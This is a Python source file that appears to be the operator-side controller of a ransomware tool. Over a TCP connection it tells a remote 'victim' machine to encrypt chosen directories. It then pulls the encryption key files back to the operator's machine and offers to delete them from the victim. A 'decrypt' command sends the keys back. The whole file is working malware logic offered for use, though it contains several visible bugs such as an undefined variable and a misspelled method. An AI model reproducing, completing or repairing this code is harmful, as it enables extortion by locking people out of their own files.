import os, sys
import time, socket

def config(ip_address,port):
    try:
        os.system("cls")
        IP = ip_address
        PORT = port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))

    except ConnectionRefusedError:
        print("[+] That ip is not available in the network or script is not running yet!!")
        time.sleep(2)
        print("exiting the script..../")
        time.sleep(2)
        os.system("cls")
        sys.exit()

    except ConnectionAbortedError:
        print("[+] the script is shutdown them self because a reason!!!")

    except KeyboardInterrupt:
        print("\n [+] KeyboardInterrupt")

    except EOFError:
        print("[+] EOFError")

    except Exception as e:
        print("exception detected is " + str(e))

    except BrokenPipeError:
        print("[+] connection to victim is unstable!!!")

default_folder_name = ("key_folder")

def receiving_files():
    start_ = time.perf_counter()
    if os.path.exists(default_folder_name) == False:
        os.makedirs(default_folder_name)
    os.chdir(default_folder_name)
    file_size = s.recv(4000)
    file_size = int(file_size.decode())
    counter = 0
    print("[+] Please be patient the script is receiving the files")
    while True:
        filename = s.recv(4000)
        filename = filename.decode()
        buff_size = s.recv(4000)
        buff_size = int(buff_size.decode())
        with open(filename, "wb") as file:
            data = s.recv(buff_size)
            file.write(data)
            file.close()
        counter = counter + 1
        if counter == file_size:
            break
    ends_time = time.perf_counter()
    print(f"[+] all files has been received succesfully in {round(ends_time-start_)} seconds(s)")
    time.sleep(2)    

os_types = []

def clear_screen():
    os_type = os_types[0]
    if os_type == "possix":
        os.system("clear")
    else:
        os.system("cls")


def start(ip_address,port,os_type):
    os_types.append(os_types)
    config(ip_address,port)
    while True:
        try:
            command = input(str("command >> "))
            if ("encrypt") in command:
                _start = time.perf_counter()
                s.send(command.encode())
                local_disk = str(input("input the dirs you want to encrypt: "))    
                s.send(local_disk.encode())
                receiving_files()
                confirm_del = str(input("delete the key file in victim PC? "))
                if "y" in confirm:
                    s.send(str("delete dirs").encode())
                else:
                    s.send(str("pass").encode())
                _ends = time.perf_counter()
                print(f"script has been executed in {_ends-_start}")

            elif ("decrypt") in command:
                _start = time.perf_counter()
                s.send(command.encode())
                path_key = str(input("Input the Key path: "))
                local_disk  = str(input("what's the path for this key: "))
                s.send(local_disk.encode())
                try:
                    os.chdir(path_key)
                    path = os.getcwd()
                    list_file = os.listdir(path)
                    ammount_files = len(list_file)
                    print("[+] sending files ammount...")
                    time.sleep(3)
                    convert_to_str = str(ammount_files)
                    send_ammount = s.send(convert_to_str.encode())
                    print("preparing to sending key...")
                    time.sleep(3)
                    for files in list_file:
                        print(f"sending filename called {files}....")
                        time.sleep(3)
                        send_filename = s.send(files.encode())
                        print(f"sending buff size of file {files}...")
                        time.sleep(3)
                        buff_size = os.path.getsize(files)
                        convert_to_str = str(buff_size)
                        send_size = s.send(convert_to_str.encode())
                        print("sending the file data...")
                        time.sleep(3)
                        with open(files, "rb") as file:
                            data = file.read()
                            sending_data = s.send(data)
                            file.close()
                    print("waiting for confirmation")
                    confirmation = s.recv(3000)
                    confirm = confirmation.decode()
                    print(confirm)

                except FileNotFoundError:
                    print("[+] File key is not found!!!")
                    time.sleep(3)
                    pass
                ends_time = time.perf_counter()
                print(f"program executed in {round(ends_time-_start)} seconds(s)")

            elif ("exit") in command:
                print("are you sure to exit program?")
                respond = input(str("proceed? [y/n]: "))
                if ("y") in respond:
                    s.sennd(str(command).encode())
                    clear_screen()
                    s.close()
                    break

                elif ("n") in respond:
                    pass

                else:
                    pass

            elif ("clear") in command:
                os.system("cls")

            elif len(command) == 0:
                print("[+] type your command!!")

            else:
                print(f"bash {command} command not found!!")

        except KeyboardInterrupt:
            print("[+] KeyboardInterrupt")

        except EOFError:
            print("[+] EOFError")
    return